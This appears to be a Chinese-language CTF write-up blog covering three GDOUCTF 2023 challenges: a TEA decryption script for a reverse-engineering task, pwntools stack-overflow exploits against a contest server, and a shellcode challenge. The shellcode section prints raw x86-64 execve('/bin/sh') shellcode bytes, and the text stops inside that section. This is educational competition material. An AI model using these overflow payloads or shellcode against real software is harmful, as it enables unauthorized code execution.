punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xaabbccdd</span><span class="token punctuation">,</span> <span class="token number">0x01234567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">tea_encrypt</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"tea_encrypt:%x %x\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"tea_decrypt:%x %x\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong><code>tea</code> 算法最关键的是要找到 <code>δ（Delta）</code> 的值和 128 位的 <code>key</code></strong></p><p>在逆向程序的时候，可以利用 IDA 的插件 <code>Findcrypt</code> 识别 <code>tea</code> 算法（有时可能不成功）</p></blockquote><p>回到 <code>sub_140016230()</code> 函数中，关键在 <code>if ( v6 )</code> 判断之前的这部分：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea5.png" alt="2023GDOUCTF-tea5.png"></p><p>① 根据形式和程序的输出，<code>sub_1400111FE(&quot;%x&quot;, &amp;v8[j])</code> 应该是一个 <code>scanf()</code> 函数<br>让用户输入十六进制的数据，共需要输入 10 个</p><p>② 初始时：<br><code>v7[0] = 1234</code><br><code>v7[1] = 5678</code><br><code>v7[2] = 9012</code><br><code>v7[3] = 3456</code></p><p>③ 后面的 <code>sub_140011339(v7)</code> 函数会调用 <code>sub_1400117D0(a1)</code> 函数，改变了 <code>v7</code> 中的值：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea6.png" alt="2023GDOUCTF-tea6.png"></p><p>④ 修改后：<br><code>v7[0] = 2233</code><br><code>v7[1] = 4455</code><br><code>v7[2] = 6677</code><br><code>v7[3] = 8899</code></p><p>函数 <code>sub_140011145(v8, v9)</code> 会调用 <code>sub_140012030(a1, a2)</code> 实现 <code>v8</code> 往 <code>v9</code> 复制的操作<br>但是注意到后面并没有用到 <code>v9</code>，于是不管</p><p>跟进 <code>sub_1400112B7(v8, v7)</code> 函数，会执行 <code>sub_140011900(a1, a2)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea7.png" alt="2023GDOUCTF-tea7.png"></p><p>根据前面的了解，这个应该就是 <code>tea</code> 算法的实现了</p><p><strong>接下来重点就是要找出 <code>tea</code> 算法中 <code>δ（Delta）</code> 的值和 128 位的 <code>key</code>，以及密文了</strong><br>① 前面通过 <code>check()</code> 函数可知，check 是将用户输入与这一段数据进行校验：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea8.png" alt="2023GDOUCTF-tea8.png"></p><p>那么这些数据肯定就是 <code>tea</code> 算法加密后的密文了</p><p>② 注意实现 <code>tea</code> 算法的函数 <code>sub_1400112B7(v8, v7)</code> 的传参是 <code>v7</code> 和 <code>v8</code><br>而 <code>v8</code> 是用户的输入，也就是明文，那剩下的一个 <code>v7</code> 必然就是加密的 <code>key</code> 了：<br><code>v7[0] = 2233</code><br><code>v7[1] = 4455</code><br><code>v7[2] = 6677</code><br><code>v7[3] = 8899</code><br>每个 <code>v7[]</code> 有 32 位，四个正好 128 位</p><p>③ 最后，注意到 <code>tea</code> 算法的加密过程会有一个操作是： <code>sum += DELTA</code> 累加 <code>Delta</code> 的值<br>结合 IDA 给出的伪代码，<code>Delta = 256256256</code></p><p>剩下的就是根据逻辑写出解密的脚本了<br>形式好像跟网上介绍的 <code>tea</code> 算法不一样，可能有魔改，直接用原版貌似跑不出来<br>所以可以<em>直接基于 IDA 的伪代码进行改写</em></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">256256256</span>  </span></span>  <span class="token keyword">void</span> <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v7 <span class="token operator">=</span> <span class="token number">4455</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v8 <span class="token operator">=</span> <span class="token number">6677</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v9 <span class="token operator">=</span> <span class="token number">8899</span><span class="token punctuation">;</span>      <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v5<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v3<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          v6 <span class="token operator">=</span> <span class="token number">256256256</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v3 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>              <span class="token operator">++</span>v5<span class="token punctuation">;</span>              a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> a2<span class="token punctuation">[</span><span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                                                           <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> v6 <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> a2<span class="token punctuation">[</span>v6 <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                v6 <span class="token operator">-=</span> <span class="token number">256256256</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x20</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v5 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v9<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v9<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v9<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// v7存放密钥key  </span>    v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5678</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9012</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3456</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// v8存放密文  </span>    v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">444599258</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">140107365</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1226314200</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">234802392</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">359413339</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1013885656</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2066432216</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">249921817</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">856928850</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">576724359</span><span class="token punctuation">;</span>        <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 先修改v7的值  </span>    <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// tea的解密算法  </span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 输出明文  </span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> m <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>m<span class="token punctuation">)</span>              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{hzCtf_94_re666fingcry5641qq}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea9.png" alt="2023GDOUCTF-tea9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GDOUCTF 2023】EASY_PWN</title>
      <link href="/posts/dcd6636.html"/>
      <url>/posts/dcd6636.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>比较经典的栈溢出，但是<mark>不要被前面的猜随机数迷惑了，直接溢出修改关键值</mark></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】EASY_PWN</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>在 Ubuntu 下分析文件，并给予执行权限运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-EASY_PWN1.png" alt="2023GDOUCTF-EASY_PWN1.png"></p><p>用 64 位 IDA 打开，定位到主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-EASY_PWN2.png" alt="2023GDOUCTF-EASY_PWN2.png"></p><p>主要是函数 <code>check()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-EASY_PWN3.png" alt="2023GDOUCTF-EASY_PWN3.png"></p><p>注意到有个 <code>print_flag()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-EASY_PWN4.png" alt="2023GDOUCTF-EASY_PWN4.png"></p><p>这个函数读取了靶机上的 <code>flag.txt</code> 文件，并将里面的内容输出，因此执行这个函数可以直接获得 <code>flag</code></p><p>在 <code>check()</code> 函数的前半段有一个生成随机数的代码：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-EASY_PWN5.png" alt="2023GDOUCTF-EASY_PWN5.png"></p><p>这里调用 <code>urandom</code> 文件往 <code>buf</code> 中写入随机数<br>然后通过 <code>gets()</code> 获取用户输入 <code>s1</code>，如果 <code>s1</code> 与 随机生成的 <code>buf</code> 相等，就将 <code>v5</code> 的值改为 1<br>当 <code>v5 == 1</code> 时就可以调用 <code>print_flag()</code> 函数输出 flag</p><p>由于这里输入使用的是 <code>gets()</code> 函数，也就是说 <code>s1</code> 是必定可以溢出的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-EASY_PWN6.png" alt="2023GDOUCTF-EASY_PWN6.png"></p><p>观察栈中数据的位置，发现 <code>v5</code> 在 <code>s1</code> 的下方，因此 <code>v5</code> 是可以被 <code>s1</code> 通过 <code>gets()</code> 覆盖的</p><blockquote><p>这里注意：<br><strong>不要被前面的猜随机数给迷惑了</strong><br><strong>是否执行 <code>print_flag()</code> 函数取决于 <code>v5</code> 的值是否非 0，而与是否猜对 <code>buf</code> 中的内容无关</strong><br><strong>因此大可不必去管 <code>urandom</code> 生成的随机数是什么</strong></p></blockquote><p>除此之外，通过 <code>s1</code> 直接覆盖返回值执行 <code>print_flag()</code> 函数也是可以的</p><p>因此这个题有两种思路：</p><ol><li>通过溢出 <code>s1</code> 修改 <code>v5</code> 的值，只要将 <code>v5</code> 改为非 0 值即可</li><li>通过溢出 <code>s1</code> 修改函数返回地址，使其直接跳转到 <code>print_flag()</code> 函数</li></ol><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><blockquote><p>将 v5 的值修改为 1（或者其他非 0 值都可以）</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28291</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1F</span> <span class="token operator">-</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从s1到v5需要填充0x1F - 0x04个字节，p64(1)将v5修改为1</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Password:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><blockquote><p>直接将返回地址修改为 <code>print_flag()</code> 的地址<br>  <em>（不过有一点不太明白，既然开启了 PIE 地址随机化，为什么还能直接得到 <code>print_flag()</code> 的真实地址）</em></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>print_flag <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'print_flag'</span><span class="token punctuation">]</span>  <span class="token comment"># 通过elf获取ptint_flag()函数的地址</span><span class="token comment"># ptint_flag_addr = 0x0011D5  # 在IDA直接查看ptint_flag()函数的地址，两种方法都可以</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28291</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1F</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>print_flag<span class="token punctuation">)</span>        <span class="token comment"># payload = b'a' * (0x1F + 0x08) + p64(ptint_flag_addr)  # 两种方法都可以</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Password:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{2e00ef92-c970-45a0-b36e-2287f14151d5}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-EASY_PWN7.png" alt="2023GDOUCTF-EASY_PWN7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GDOUCTF 2023】Shellcode</title>
      <link href="/posts/c7868b4c.html"/>
      <url>/posts/c7868b4c.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>写入 <code>shellcode</code> 的时候，一定要注意可写入的空间的大小，有时生成的 <code>shellcode</code> 的长度会超出可写入空间</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】Shellcode</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>在 Ubuntu 下分析文件，并给予执行权限运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-ezshellcode1.png" alt="2023GDOUCTF-ezshellcode1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-ezshellcode2.png" alt="2023GDOUCTF-ezshellcode2.png"></p><p>用 64 位 IDA 打开，定位到主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-ezshellcode3.png" alt="2023GDOUCTF-ezshellcode3.png"></p><p>这里的 <code>name</code> 是写入到 <code>bss</code> 段上的，<code>buf</code> 写在栈上：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-ezshellcode4.png" alt="2023GDOUCTF-ezshellcode4.png"></p><p>但是 <code>buf</code> 的栈只有 <code>0x0A</code> 的大小，可写入 <code>0x40</code> 的长度，所以存在栈溢出</p><p>于是思路就比较明确了：</p><ol><li>通过 <code>name</code> 往 <code>bss</code> 段上写入 <code>shellcode</code></li><li>通过 <code>buf</code> 溢出，将跳转地址改为 <code>shellcode</code> 的地址，执行 <code>shellcode</code></li></ol><blockquote><p>虽然比赛时我的思路是对的，但是这个题有一点不一样<br><strong>因为 <code>name</code> 可以写入的大小只有 <code>0x25</code>，所以对 <code>shellcode</code> 的大小有一定的要求</strong><br><strong>使用 <code>pwntools</code> 生成的默认 <code>shellcode</code> 是不行的</strong></p></blockquote><p>验证一下，例如使用 <code>pwntools</code> 生成默认 <code>shellcode</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span><span class="token keyword">print</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment"># b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 0x30</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以看到 <code>pwntools</code> 生成的默认 <code>shellcode</code> 长度为 <code>0x30</code> 长于可写入的长度 <code>0x25</code></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 在网上找到的两个比较短一点的 shellcode</span><span class="token comment"># 这样的 shellcode 长度只有 0x1e</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05'</span><span aria-hidden="true" 